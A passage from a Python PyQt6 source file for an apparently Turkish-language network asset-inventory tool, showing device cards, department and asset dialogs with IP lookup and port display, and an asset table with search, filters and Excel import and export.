        super().__init__(parent);self.device=device;self.setup_ui();self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu);self.customContextMenuRequested.connect(self.show_context_menu)
    def setup_ui(self):
        self.setObjectName("card");self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setMinimumHeight(115);self.setMaximumHeight(155)
        self.setSizePolicy(QSizePolicy.Policy.Fixed,QSizePolicy.Policy.Fixed)
        online=self.device.status=="online";matched=bool(self.device.asset_name);critical=self.device.is_critical
        border="#ff4444" if critical else "#00ff88" if matched else "#0f3460" if online else "#333"
        self.setStyleSheet(f"#card{{background:{'#1e2a3a' if online else '#252538'};border:2px solid {border};border-radius:8px;}}#card:hover{{border:2px solid #00ff88;}}")
        layout=QVBoxLayout(self);layout.setSpacing(2);layout.setContentsMargins(6,5,6,5)
        header=QHBoxLayout();header.setSpacing(4)
        if self.device.asset_type:
            try:icon_text=ASSET_CONFIG[AssetType(self.device.asset_type)]['icon']
            except:icon_text="❓"
        else:icon_text="⚫" if not online else "💻"
        icon=QLabel(icon_text);icon.setStyleSheet("font-size:16px;");header.addWidget(icon)
        info=QVBoxLayout();info.setSpacing(0)
        if self.device.asset_name:
            name_label=QLabel(self.device.asset_name[:22])
            name_label.setStyleSheet(f"font-weight:bold;font-size:10px;color:{'#ff6b6b' if critical else '#00ff88'};")
            info.addWidget(name_label)
        ip_label=QLabel(self.device.ip);ip_label.setStyleSheet(f"font-size:9px;color:{'#00d4ff' if online else '#666'};");info.addWidget(ip_label)
        hostname=self.device.hostname or self.device.netbios_name
        if hostname:h_label=QLabel(hostname[:18]);h_label.setStyleSheet("color:#888;font-size:8px;");info.addWidget(h_label)
        header.addLayout(info);header.addStretch()
        status=QLabel("●");status.setStyleSheet(f"font-size:10px;color:{'#2ecc71' if online else '#e74c3c'};");header.addWidget(status);layout.addLayout(header)
        if online:
            if self.device.department_name:dept_label=QLabel(f"🏢 {self.device.department_name[:18]}");dept_label.setStyleSheet("color:#ffd93d;font-size:8px;");layout.addWidget(dept_label)
            if self.device.location:loc_label=QLabel(f"📍 {self.device.location[:18]}");loc_label.setStyleSheet("color:#888;font-size:7px;");layout.addWidget(loc_label)
            if self.device.vnc_available:
                btn=QPushButton("🖥️ VNC Bağlan");btn.setStyleSheet("QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #27ae60,stop:1 #2ecc71);color:white;border:none;border-radius:4px;padding:3px;font-weight:bold;font-size:8px;}QPushButton:hover{background:#2ecc71;}")
                btn.clicked.connect(lambda:self.vnc_connect.emit(self.device));layout.addWidget(btn)
            elif self.device.open_ports:ports=", ".join(str(p) for p in self.device.open_ports[:3]);p_label=QLabel(f"🔓 {ports}");p_label.setStyleSheet("color:#5dade2;font-size:7px;");layout.addWidget(p_label)
            # Device type ve Vendor bilgisi
            if self.device.device_type and self.device.device_type != "unknown":
                dtype_icons = {'router': '🌐', 'switch': '🔀', 'camera': '📹', 'printer': '🖨️', 'computer': '💻', 'nas': '💾', 'firewall': '🔥', 'server': '🖥️', 'access_point': '📡'}
                dtype_icon = dtype_icons.get(self.device.device_type, '📦')
                dtype_label = QLabel(f"{dtype_icon} {self.device.device_type.capitalize()}")
                dtype_label.setStyleSheet("color:#00d4ff;font-size:7px;font-weight:bold;")
                layout.addWidget(dtype_label)
            if self.device.vendor:
                vendor_text = self.device.vendor[:20] + "…" if len(self.device.vendor) > 20 else self.device.vendor
                vendor_label = QLabel(f"🏭 {vendor_text}")
                vendor_label.setStyleSheet("color:#9b9b9b;font-size:7px;")
                layout.addWidget(vendor_label)
    def mousePressEvent(self,e):
        if e.button()==Qt.MouseButton.LeftButton:self.clicked.emit(self.device)
    def show_context_menu(self,pos):
        menu=QMenu(self)
        menu.setStyleSheet("QMenu{background:#1a1a2e;color:white;border:1px solid #0f3460;border-radius:8px;padding:5px;}QMenu::item{padding:8px 20px;border-radius:4px;}QMenu::item:selected{background:#0f3460;}QMenu::separator{height:1px;background:#0f3460;margin:5px 10px;}")
        if self.device.asset_id:
            edit_act=menu.addAction("✏️ Varlığı Düzenle");edit_act.triggered.connect(lambda:self.edit_asset.emit(self.device))
            menu.addSeparator()
        else:
            assign_menu=menu.addMenu("📋 Hızlı Varlık Ata")
            for atype in AssetType:
                cfg=ASSET_CONFIG[atype];act=assign_menu.addAction(f"{cfg['icon']} {cfg['name']}");act.triggered.connect(lambda c,t=atype.value:self.assign_asset.emit(self.device,t))
            menu.addSeparator()
        if self.device.vnc_available:vnc_act=menu.addAction("🖥️ VNC Bağlan");vnc_act.triggered.connect(lambda:self.vnc_connect.emit(self.device));menu.addSeparator()
        copy_ip=menu.addAction("📋 IP Kopyala");copy_ip.triggered.connect(lambda:QApplication.clipboard().setText(self.device.ip))
        if self.device.mac:copy_mac=menu.addAction("📋 MAC Kopyala");copy_mac.triggered.connect(lambda:QApplication.clipboard().setText(self.device.mac))
        menu.addSeparator();details_act=menu.addAction("🔍 Detayları Göster");details_act.triggered.connect(lambda:self.clicked.emit(self.device))
        menu.exec(self.mapToGlobal(pos))

# ============= DIALOGS =============
class DepartmentDialog(QDialog):
    def __init__(self,parent=None,department=None):
        super().__init__(parent);self.department=department;self.setWindowTitle("Birim Ekle" if not department else "Birim Düzenle");self.setWindowIcon(create_app_icon());self.setMinimumWidth(400)
        layout=QFormLayout(self)
        self.name_input=QLineEdit(department.name if department else "");self.name_input.setPlaceholderText("Birim adı...");layout.addRow("Birim Adı:",self.name_input)
        self.location_input=QLineEdit(department.location if department else "");self.location_input.setPlaceholderText("Bina/Kat...");layout.addRow("Konum:",self.location_input)
        self.desc_input=QLineEdit(department.description if department else "");self.desc_input.setPlaceholderText("Açıklama...");layout.addRow("Açıklama:",self.desc_input)
        self.color=department.color if department else "#00ff88"
        color_layout=QHBoxLayout();self.color_btn=QPushButton();self.color_btn.setFixedSize(30,30);self.color_btn.setStyleSheet(f"background:{self.color};border-radius:5px;");self.color_btn.clicked.connect(self.choose_color);color_layout.addWidget(self.color_btn);color_layout.addStretch();layout.addRow("Renk:",color_layout)
        buttons=QDialogButtonBox(QDialogButtonBox.StandardButton.Ok|QDialogButtonBox.StandardButton.Cancel);buttons.accepted.connect(self.accept);buttons.rejected.connect(self.reject);layout.addRow(buttons)
    def choose_color(self):color=QColorDialog.getColor(QColor(self.color),self);self.color=color.name() if color.isValid() else self.color;self.color_btn.setStyleSheet(f"background:{self.color};border-radius:5px;")
    def get_data(self):return {'name':self.name_input.text().strip(),'location':self.location_input.text().strip(),'description':self.desc_input.text().strip(),'color':self.color}

class AssetDialog(QDialog):
    def __init__(self,parent=None,asset=None,departments=None):
        super().__init__(parent);self.asset=asset;self.selected_type=AssetType.PERSON;self.setWindowTitle("Varlık Ekle" if not asset else "Varlık Düzenle");self.setWindowIcon(create_app_icon());self.setMinimumWidth(520)
        self.scan_thread=None
        layout=QVBoxLayout(self)
        type_group=QGroupBox("📋 Varlık Türü");type_layout=QGridLayout(type_group);self.type_buttons={}
        row,col=0,0
        for atype in AssetType:
            cfg=ASSET_CONFIG[atype];btn=QPushButton(f"{cfg['icon']} {cfg['name']}");btn.setCheckable(True);btn.setMinimumHeight(30)
            btn.setStyleSheet(f"QPushButton{{background:#16213e;border:2px solid #0f3460;border-radius:5px;color:white;font-size:10px;}}QPushButton:checked{{background:{cfg['color']};color:#1a1a2e;border-color:{cfg['color']};}}QPushButton:hover{{border-color:{cfg['color']};}}")
            btn.clicked.connect(lambda c,t=atype:self.select_type(t));self.type_buttons[atype]=btn;type_layout.addWidget(btn,row,col);col+=1
            if col>3:col=0;row+=1
        layout.addWidget(type_group)
        info_group=QGroupBox("📝 Temel Bilgiler");info_layout=QFormLayout(info_group)
        self.name_input=QLineEdit(asset.name if asset else "");self.name_input.setPlaceholderText("Ad...");info_layout.addRow("Ad:",self.name_input)
        self.dept_combo=QComboBox()
        for dept in (departments or []):self.dept_combo.addItem(f"🏢 {dept.name}",dept.id)
        info_layout.addRow("Birim:",self.dept_combo)
        self.location_input=QLineEdit(asset.location if asset else "");self.location_input.setPlaceholderText("Oda, Kat...");info_layout.addRow("Konum:",self.location_input);layout.addWidget(info_group)
        
        # Ağ Bilgileri - IP Tarama özelliği ile
        net_group=QGroupBox("🌐 Ağ Bilgileri");net_layout=QFormLayout(net_group)
        
        # IP satırı - input + tarama butonu
        ip_row=QHBoxLayout()
        self.ip_input=QLineEdit(asset.ip_address if asset else "");self.ip_input.setPlaceholderText("IP adresi girin ve Tara'ya basın...");ip_row.addWidget(self.ip_input)
        self.scan_btn=QPushButton("🔍 Tara");self.scan_btn.setFixedWidth(70);self.scan_btn.setToolTip("IP adresini tarayarak bilgileri otomatik doldur")
        self.scan_btn.setStyleSheet("QPushButton{background:#0f3460;color:#00ff88;border:1px solid #00ff88;border-radius:4px;font-weight:bold;}QPushButton:hover{background:#00ff88;color:#1a1a2e;}QPushButton:disabled{background:#333;color:#666;border-color:#333;}")
        self.scan_btn.clicked.connect(self.scan_ip);ip_row.addWidget(self.scan_btn)
        net_layout.addRow("IP:",ip_row)
        
        # Tarama durumu
        self.scan_status=QLabel("");self.scan_status.setStyleSheet("color:#00ff88;font-size:10px;");net_layout.addRow("",self.scan_status)
        
        self.hostname_input=QLineEdit(asset.hostname if asset else "");self.hostname_input.setPlaceholderText("Bilgisayar/Cihaz adı...");net_layout.addRow("Hostname:",self.hostname_input)
        self.mac_input=QLineEdit(asset.mac_address if asset else "");self.mac_input.setPlaceholderText("AA:BB:CC:DD:EE:FF");net_layout.addRow("MAC:",self.mac_input)
        self.vendor_input=QLineEdit(asset.vendor if asset else "");self.vendor_input.setPlaceholderText("Intel, Realtek, Ubiquiti...");self.vendor_input.setStyleSheet("color:#00ff88;");net_layout.addRow("Vendor:",self.vendor_input)
        self.ports_input=QLineEdit(asset.open_ports if asset else "");self.ports_input.setPlaceholderText("80(HTTP), 443(HTTPS), 3389(RDP)...");self.ports_input.setStyleSheet("color:#5dade2;");net_layout.addRow("Açık Portlar:",self.ports_input)
        layout.addWidget(net_group)
        
        detail_group=QGroupBox("📦 Detaylar");detail_layout=QFormLayout(detail_group)
        self.model_input=QLineEdit(asset.model if asset else "");self.model_input.setPlaceholderText("Model...");detail_layout.addRow("Model:",self.model_input)
        self.serial_input=QLineEdit(asset.serial_number if asset else "");self.serial_input.setPlaceholderText("Seri No...");detail_layout.addRow("Seri No:",self.serial_input)
        self.notes_input=QLineEdit(asset.notes if asset else "");self.notes_input.setPlaceholderText("Notlar...");detail_layout.addRow("Notlar:",self.notes_input)
        self.critical_check=QCheckBox("⚠️ Kritik Varlık");self.critical_check.setChecked(asset.is_critical if asset else False);detail_layout.addRow(self.critical_check);layout.addWidget(detail_group)
        
        # Donanım Bilgileri (Sistem Taramasından - Sadece görüntüleme)
        if asset and asset.last_hw_scan:
            hw_group=QGroupBox("💻 Donanım Bilgileri (Son Tarama)")
            hw_layout=QFormLayout(hw_group)
            hw_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            
            # İşletim Sistemi
            if asset.os_name:
                os_label=QLabel(f"{asset.os_name}")
                os_label.setStyleSheet("color:#00d4ff;")
                hw_layout.addRow("OS:",os_label)
            
            # CPU
            if asset.cpu_name:
                cpu_text=asset.cpu_name
                if asset.cpu_cores:
                    cpu_text+=f" ({asset.cpu_cores} Cores"
                    if asset.cpu_threads:
                        cpu_text+=f"/{asset.cpu_threads} Threads"
                    cpu_text+=")"
                cpu_label=QLabel(cpu_text)
                cpu_label.setStyleSheet("color:#00ff88;")
                cpu_label.setWordWrap(True)
                hw_layout.addRow("CPU:",cpu_label)
            
            # RAM
            if asset.ram_total:
                ram_label=QLabel(asset.ram_total)
                ram_label.setStyleSheet("color:#f39c12;")
                hw_layout.addRow("RAM:",ram_label)
            
            # GPU
            if asset.gpu_name:
                gpu_text=asset.gpu_name
                if asset.gpu_vram:
                    gpu_text+=f" ({asset.gpu_vram})"
                gpu_label=QLabel(gpu_text)
                gpu_label.setStyleSheet("color:#9b59b6;")
                gpu_label.setWordWrap(True)
                hw_layout.addRow("GPU:",gpu_label)
            
            # Disk(ler)
            if asset.disks:
                # Yeni format - ayrı satırlarda
                for i, disk in enumerate(asset.disks):
                    model = disk.get('model', '')
                    size = disk.get('size', '')
                    dtype = disk.get('type', '')
                    disk_text = f"{model}" if model else ""
                    if size:
                        disk_text += f" ({size})" if disk_text else size
                    if dtype:
                        disk_text += f" [{dtype}]"
                    
                    disk_label = QLabel(disk_text)
                    # Renk kodlama: SSD=yeşil, HDD=turuncu
                    if 'ssd' in dtype.lower() or 'nvme' in dtype.lower():
                        disk_label.setStyleSheet("color:#00ff88;")
                    else:
                        disk_label.setStyleSheet("color:#f39c12;")
                    disk_label.setWordWrap(True)
                    hw_layout.addRow(f"Disk {i+1}:", disk_label)
            elif asset.disk_info:
                # Eski format (uyumluluk için)
                disk_label=QLabel(asset.disk_info)
                disk_label.setStyleSheet("color:#e74c3c;")
                disk_label.setWordWrap(True)
                hw_layout.addRow("Disk:",disk_label)
            
            # PC Üretici/Model
            if asset.pc_manufacturer or asset.pc_model:
                pc_text=f"{asset.pc_manufacturer} {asset.pc_model}".strip()
                pc_label=QLabel(pc_text)
                pc_label.setStyleSheet("color:#888;")
                hw_layout.addRow("PC:",pc_label)
            
            # Son tarama tarihi
            scan_label=QLabel(f"📅 {asset.last_hw_scan}")
            scan_label.setStyleSheet("color:#666;font-size:10px;")
            hw_layout.addRow("Tarama:",scan_label)
            
            layout.addWidget(hw_group)
        
        buttons=QDialogButtonBox(QDialogButtonBox.StandardButton.Ok|QDialogButtonBox.StandardButton.Cancel);buttons.accepted.connect(self.accept);buttons.rejected.connect(self.reject);layout.addWidget(buttons)
        if asset:
            try:self.select_type(AssetType(asset.asset_type))
            except:self.select_type(AssetType.OTHER)
            idx=self.dept_combo.findData(asset.department_id)
            if idx>=0:self.dept_combo.setCurrentIndex(idx)
        else:self.select_type(AssetType.PERSON)
    
    def select_type(self,atype):
        for t,btn in self.type_buttons.items():btn.setChecked(t==atype)
        self.selected_type=atype
    
    def scan_ip(self):
        ip=self.ip_input.text().strip()
        if not ip:
            self.scan_status.setText("❌ IP adresi girin!");self.scan_status.setStyleSheet("color:#e74c3c;font-size:10px;")
            return
        # IP format kontrolü
        import re
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',ip):
            self.scan_status.setText("❌ Geçersiz IP formatı!");self.scan_status.setStyleSheet("color:#e74c3c;font-size:10px;")
            return
        
        self.scan_btn.setEnabled(False);self.scan_btn.setText("⏳...")
        self.scan_status.setText("🔍 Taranıyor...");self.scan_status.setStyleSheet("color:#f39c12;font-size:10px;")
        QApplication.processEvents()
        
        # Senkron tarama (dialog içinde thread kullanmak karmaşık)
        try:
            arp=get_arp_table()
            device=scan_device(ip,arp,None)
            
            if device.status=="online":
                # Bilgileri doldur
                if device.hostname or device.netbios_name:
                    hostname=device.hostname or device.netbios_name
                    self.hostname_input.setText(hostname)
                    if not self.name_input.text():
                        self.name_input.setText(hostname)
                
                if device.mac:
                    self.mac_input.setText(device.mac)
                
                if device.vendor:
                    self.vendor_input.setText(device.vendor)
                else:
                    self.vendor_input.setText("")
                
                if device.open_ports:
                    ports_str=", ".join(f"{p}({COMMON_PORTS.get(p,'')})" for p in device.open_ports[:6])
                    self.ports_input.setText(ports_str)
                else:
                    self.ports_input.setText("")
                
                # Cihaz türünü otomatik seç
                if device.device_type and device.device_type!="unknown":
                    try:
                        dtype=AssetType(device.device_type)
                        self.select_type(dtype)
                    except:pass
                elif device.vnc_available:
                    self.select_type(AssetType.COMPUTER)
                elif 80 in device.open_ports or 443 in device.open_ports:
                    if 554 in device.open_ports:
                        self.select_type(AssetType.IP_CAMERA)
                    elif 161 in device.open_ports:
                        self.select_type(AssetType.ROUTER)
                
                self.scan_status.setText(f"✅ Cihaz bulundu! ({device.detection_method})")
                self.scan_status.setStyleSheet("color:#00ff88;font-size:10px;")
                
                # Notlara ek bilgi
                notes=[]
                if device.vnc_available:notes.append(f"VNC:{device.vnc_port}")
                if device.response_time>0:notes.append(f"Ping:{device.response_time:.0f}ms")
                if notes and not self.notes_input.text():
                    self.notes_input.setText(" | ".join(notes))
            else:
                self.scan_status.setText("❌ Cihaz çevrimdışı veya bulunamadı")
                self.scan_status.setStyleSheet("color:#e74c3c;font-size:10px;")
                self.vendor_input.setText("");self.ports_input.setText("")
        except Exception as e:
            self.scan_status.setText(f"❌ Hata: {str(e)[:30]}")
            self.scan_status.setStyleSheet("color:#e74c3c;font-size:10px;")
        
        self.scan_btn.setEnabled(True);self.scan_btn.setText("🔍 Tara")
    
    def get_data(self):return {'name':self.name_input.text().strip(),'asset_type':self.selected_type.value,'department_id':self.dept_combo.currentData() or "",'hostname':self.hostname_input.text().strip(),'mac_address':self.mac_input.text().strip(),'ip_address':self.ip_input.text().strip(),'location':self.location_input.text().strip(),'model':self.model_input.text().strip(),'serial_number':self.serial_input.text().strip(),'notes':self.notes_input.text().strip(),'is_critical':self.critical_check.isChecked(),'vendor':self.vendor_input.text().strip(),'open_ports':self.ports_input.text().strip()}

class QuickAssignDialog(QDialog):
    def __init__(self,device,asset_type,org,parent=None):
        super().__init__(parent);self.device=device;self.asset_type=asset_type;self.org=org
        cfg=ASSET_CONFIG.get(AssetType(asset_type),ASSET_CONFIG[AssetType.OTHER])
        self.setWindowTitle(f"{cfg['icon']} Hızlı Varlık Ata - {device.ip}");self.setWindowIcon(create_app_icon());self.setMinimumWidth(450)
        layout=QVBoxLayout(self)
        info_group=QGroupBox(f"📍 Cihaz Bilgileri");info_layout=QFormLayout(info_group)
        info_layout.addRow("IP:",QLabel(f"<b>{device.ip}</b>"))
        info_layout.addRow("Hostname:",QLabel(device.hostname or device.netbios_name or "-"))
        info_layout.addRow("MAC:",QLabel(device.mac or "-"))
        if device.vendor:info_layout.addRow("Vendor:",QLabel(device.vendor))
        layout.addWidget(info_group)
        assign_group=QGroupBox(f"{cfg['icon']} {cfg['name']} Olarak Kaydet");assign_layout=QFormLayout(assign_group)
        self.name_input=QLineEdit(device.hostname or device.netbios_name or f"Cihaz-{device.ip.split('.')[-1]}");self.name_input.setPlaceholderText("Varlık adı...");assign_layout.addRow("Ad:",self.name_input)
        self.dept_combo=QComboBox()
        if not org.get_departments():self.dept_combo.addItem("⚠️ Önce birim ekleyin!","")
        for dept in org.get_departments():self.dept_combo.addItem(f"🏢 {dept.name}",dept.id)
        assign_layout.addRow("Birim:",self.dept_combo)
        self.location_input=QLineEdit();self.location_input.setPlaceholderText("Oda, kat, konum...");assign_layout.addRow("Konum:",self.location_input)
        self.critical_check=QCheckBox("⚠️ Kritik Varlık Olarak İşaretle");assign_layout.addRow(self.critical_check)
        layout.addWidget(assign_group)
        buttons=QDialogButtonBox(QDialogButtonBox.StandardButton.Ok|QDialogButtonBox.StandardButton.Cancel);buttons.accepted.connect(self.accept);buttons.rejected.connect(self.reject);layout.addWidget(buttons)
    def get_data(self):
        return {'name':self.name_input.text().strip(),'asset_type':self.asset_type,'department_id':self.dept_combo.currentData() or "",'hostname':self.device.hostname or self.device.netbios_name or "",'mac_address':self.device.mac or "",'ip_address':self.device.ip,'location':self.location_input.text().strip(),'is_critical':self.critical_check.isChecked()}

class OrganizationWidget(QWidget):
    def __init__(self,org,parent=None):
        super().__init__(parent);self.org=org;self.setup_ui();self.refresh_all()
    def setup_ui(self):
        layout=QHBoxLayout(self);layout.setSpacing(6);layout.setContentsMargins(4,4,4,4)
        splitter=QSplitter(Qt.Orientation.Horizontal);splitter.setHandleWidth(3);splitter.setStyleSheet("QSplitter::handle{background:#0f3460;border-radius:2px;}")
        
        left=QWidget();left.setMinimumWidth(180);left.setMaximumWidth(280);left_layout=QVBoxLayout(left);left_layout.setContentsMargins(0,0,0,0);left_layout.setSpacing(4)
        left_layout.addWidget(QLabel("🏢 Birimler"))
        self.dept_list=QListWidget();self.dept_list.setStyleSheet("QListWidget{background:#16213e;border:1px solid #0f3460;border-radius:6px;font-size:11px;}QListWidget::item{padding:6px;border-bottom:1px solid #0f3460;}QListWidget::item:selected{background:#0f3460;}")
        self.dept_list.itemClicked.connect(self.on_dept_selected)
        self.dept_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.dept_list.customContextMenuRequested.connect(self.show_dept_context_menu)
        left_layout.addWidget(self.dept_list)
        dept_btns=QHBoxLayout();dept_btns.setSpacing(2)
        for text,func in [("➕",self.add_department),("✏️",self.edit_department),("🗑️",self.delete_department)]:btn=QPushButton(text);btn.setFixedSize(36,28);btn.clicked.connect(func);dept_btns.addWidget(btn)
        dept_btns.addStretch();left_layout.addLayout(dept_btns);splitter.addWidget(left)
        
        right=QWidget();right_layout=QVBoxLayout(right);right_layout.setContentsMargins(0,0,0,0);right_layout.setSpacing(4)
        filter_bar=QHBoxLayout();filter_bar.setSpacing(4);filter_bar.addWidget(QLabel("🔍"))
        
        # İsim arama kutusu
        self.search_input=QLineEdit()
        self.search_input.setPlaceholderText("İsim, IP, Hostname ara...")
        self.search_input.setMinimumWidth(150)
        self.search_input.setStyleSheet("QLineEdit{background:#16213e;border:1px solid #0f3460;border-radius:4px;padding:4px;color:white;}")
        self.search_input.textChanged.connect(self.refresh_assets)
        filter_bar.addWidget(self.search_input)
        
        self.type_filter=QComboBox();self.type_filter.setMinimumWidth(100);self.type_filter.addItem("Tümü","")
        for atype in AssetType:cfg=ASSET_CONFIG[atype];self.type_filter.addItem(f"{cfg['icon']} {cfg['name']}",atype.value)
        self.type_filter.currentIndexChanged.connect(self.refresh_assets);filter_bar.addWidget(self.type_filter)
        
        # Donanım filtresi
        self.hw_filter=QComboBox();self.hw_filter.setMinimumWidth(120)
        self.hw_filter.addItem("💻 Donanım: Tümü", "all")
        self.hw_filter.addItem("✅ Bilgisi Var", "has_hw")
        self.hw_filter.addItem("❌ Bilgisi Yok", "no_hw")
        self.hw_filter.currentIndexChanged.connect(self.refresh_assets)
        filter_bar.addWidget(self.hw_filter)
        
        # Donanım Tara butonu
        self.hw_scan_btn=QPushButton("🔍 Donanım Tara")
        self.hw_scan_btn.setStyleSheet("QPushButton{background:#9b59b6;color:white;padding:4px 10px;border:none;border-radius:4px;font-size:10px;}QPushButton:hover{background:#8e44ad;}")
        self.hw_scan_btn.clicked.connect(self.scan_hardware_for_assets)
        filter_bar.addWidget(self.hw_scan_btn)
        
        filter_bar.addStretch()
        self.stats_label=QLabel();self.stats_label.setStyleSheet("color:#888;font-size:10px;");filter_bar.addWidget(self.stats_label);right_layout.addLayout(filter_bar)
        
        self.asset_table=QTableWidget();self.asset_table.setColumnCount(10);self.asset_table.setHorizontalHeaderLabels(["","Ad","Tür","Birim","Hostname","IP","MAC","Konum","Model","⚠️"])
        self.asset_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive);self.asset_table.horizontalHeader().setStretchLastSection(False)
        self.asset_table.horizontalHeader().resizeSection(0,30);self.asset_table.horizontalHeader().resizeSection(1,120);self.asset_table.horizontalHeader().resizeSection(5,100);self.asset_table.horizontalHeader().resizeSection(9,30)
        self.asset_table.setSortingEnabled(True)
        self.asset_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive);self.asset_table.horizontalHeader().setStretchLastSection(False)
        self.asset_table.horizontalHeader().resizeSection(0,30);self.asset_table.horizontalHeader().resizeSection(1,120);self.asset_table.horizontalHeader().resizeSection(8,30)
        self.asset_table.setAlternatingRowColors(True);self.asset_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.asset_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.asset_table.customContextMenuRequested.connect(self.show_asset_context_menu)
        self.asset_table.setStyleSheet("QTableWidget{background:#16213e;border:1px solid #0f3460;font-size:11px;}QHeaderView::section{background:#0f3460;color:#00ff88;padding:4px;font-size:10px;}");right_layout.addWidget(self.asset_table)
        
        asset_btns=QHBoxLayout();asset_btns.setSpacing(4)
        for text,func in [("➕ Ekle",self.add_asset),("✏️",self.edit_asset),("🗑️",self.delete_asset)]:btn=QPushButton(text);btn.clicked.connect(func);asset_btns.addWidget(btn)
        asset_btns.addStretch()
        # IP Güncelle butonu
        self.ip_update_btn=QPushButton("🔄 IP Güncelle")
        self.ip_update_btn.setStyleSheet("QPushButton{background:#e67e22;color:white;padding:4px 10px;border:none;border-radius:4px;font-size:10px;}QPushButton:hover{background:#d35400;}")
        self.ip_update_btn.setToolTip("Tüm varlıkların IP adreslerini kontrol et ve güncelle")
        self.ip_update_btn.clicked.connect(self.update_all_ips)
        asset_btns.addWidget(self.ip_update_btn)
        self.hostname_scan_btn=QPushButton("🖥️ Hostname Tara")
        self.hostname_scan_btn.setStyleSheet("QPushButton{background:#1abc9c;color:white;padding:4px 10px;border:none;border-radius:4px;font-size:10px;}QPushButton:hover{background:#16a085;}")
        self.hostname_scan_btn.setToolTip("Varlıkların güncel hostname bilgisini tara ve güncelle")
        self.hostname_scan_btn.clicked.connect(self.scan_hostnames_for_assets)
        asset_btns.addWidget(self.hostname_scan_btn)
        for text,func in [("📥 Import",self.import_excel),("📤 Export",self.export_excel)]:btn=QPushButton(text);btn.clicked.connect(func);asset_btns.addWidget(btn)
        right_layout.addLayout(asset_btns);splitter.addWidget(right)
        
        splitter.setSizes([200,600]);splitter.setStretchFactor(0,0);splitter.setStretchFactor(1,1)
        layout.addWidget(splitter)
    def refresh_all(self):self.refresh_departments();self.refresh_assets();self.update_stats()
    def refresh_departments(self):
        self.dept_list.clear();all_item=QListWidgetItem("📂 Tüm Birimler");all_item.setData(Qt.ItemDataRole.UserRole,"");self.dept_list.addItem(all_item)
        for dept in self.org.get_departments():count=len(self.org.get_assets(dept.id));item=QListWidgetItem(f"🏢 {dept.name} ({count})");item.setData(Qt.ItemDataRole.UserRole,dept.id);item.setForeground(QColor(dept.color));self.dept_list.addItem(item)
    def refresh_assets(self):
        self.asset_table.setRowCount(0);dept_id=self.dept_list.currentItem().data(Qt.ItemDataRole.UserRole) if self.dept_list.currentItem() else "";type_filter=self.type_filter.currentData()
        hw_filter=self.hw_filter.currentData() if hasattr(self, 'hw_filter') else "all"
        search_text = self.search_input.text().strip().lower() if hasattr(self, 'search_input') else ""
        assets=self.org.get_assets(dept_id if dept_id else None,type_filter if type_filter else None)
        
        # Donanım filtresi uygula
        if hw_filter == "has_hw":
            assets = [a for a in assets if a.last_hw_scan]
        elif hw_filter == "no_hw":
            assets = [a for a in assets if not a.last_hw_scan]
        
        # İsim/IP/Hostname arama filtresi
        if search_text:
            filtered = []
            for a in assets:
                if (search_text in a.name.lower() or 
                    search_text in (a.ip_address or "").lower() or 
                    search_text in (a.hostname or "").lower() or
                    search_text in (a.mac_address or "").lower() or
                    search_text in (a.location or "").lower() or
                    search_text in (a.model or "").lower()):
                    filtered.append(a)
            assets = filtered
        
        for asset in assets:
            row=self.asset_table.rowCount();self.asset_table.insertRow(row);cfg=asset.get_type_config();dept=self.org.departments.get(asset.department_id,Department())
            icon_item=QTableWidgetItem(cfg['icon']);icon_item.setData(Qt.ItemDataRole.UserRole,asset.id);icon_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);self.asset_table.setItem(row,0,icon_item)
            name_item=QTableWidgetItem(asset.name);name_item.setForeground(QColor(cfg['color']));self.asset_table.setItem(row,1,name_item)
            self.asset_table.setItem(row,2,QTableWidgetItem(cfg['name']));dept_item=QTableWidgetItem(dept.name);dept_item.setForeground(QColor(dept.color));self.asset_table.setItem(row,3,dept_item)
            self.asset_table.setItem(row,4,QTableWidgetItem(asset.hostname))
            ip_item=QTableWidgetItem(asset.ip_address or "");ip_item.setForeground(QColor("#00d4ff"));self.asset_table.setItem(row,5,ip_item)
            self.asset_table.setItem(row,6,QTableWidgetItem(asset.mac_address));self.asset_table.setItem(row,7,QTableWidgetItem(asset.location));self.asset_table.setItem(row,8,QTableWidgetItem(asset.model))
            crit_item=QTableWidgetItem("⚠️" if asset.is_critical else "");crit_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter);self.asset_table.setItem(row,9,crit_item)
        self.update_stats()
    def update_stats(self):
        stats=self.org.get_stats();parts=[f"Toplam: {stats['total_assets']}"]
        for t,count in stats['by_type'].items():
            try:cfg=ASSET_CONFIG[AssetType(t)];parts.append(f"{cfg['icon']}{count}")
            except:pass
        self.stats_label.setText(" | ".join(parts))
    def on_dept_selected(self,item):self.refresh_assets()
    def get_selected_dept_id(self):item=self.dept_list.currentItem();return item.data(Qt.ItemDataRole.UserRole) if item else ""
    def get_selected_asset_id(self):
        row=self.asset_table.currentRow()
        if row>=0:item=self.asset_table.item(row,0);return item.data(Qt.ItemDataRole.UserRole) if item else None
        return None
    def add_department(self):
        dialog=DepartmentDialog(self)
        if dialog.exec()==QDialog.DialogCode.Accepted:
            data=dialog.get_data()
            if data['name']:self.org.add_department(**data);self.refresh_all()
    def edit_department(self):
        dept_id=self.get_selected_dept_id()
        if not dept_id:return QMessageBox.warning(self,"Uyarı","Bir birim seçin!")
        dept=self.org.departments.get(dept_id)
        if dept:
            dialog=DepartmentDialog(self,dept)
            if dialog.exec()==QDialog.DialogCode.Accepted:self.org.update_department(dept_id,**dialog.get_data());self.refresh_all()
    def delete_department(self):
        dept_id=self.get_selected_dept_id()
        if not dept_id:return QMessageBox.warning(self,"Uyarı","Bir birim seçin!")
        dept=self.org.departments.get(dept_id)
        if dept and QMessageBox.question(self,"Onay",f"'{dept.name}' ve içindeki tüm varlıklar silinecek?")==QMessageBox.StandardButton.Yes:self.org.delete_department(dept_id);self.refresh_all()
    def add_asset(self):
        depts=self.org.get_departments()
        if not depts:return QMessageBox.warning(self,"Uyarı","Önce bir birim ekleyin!")
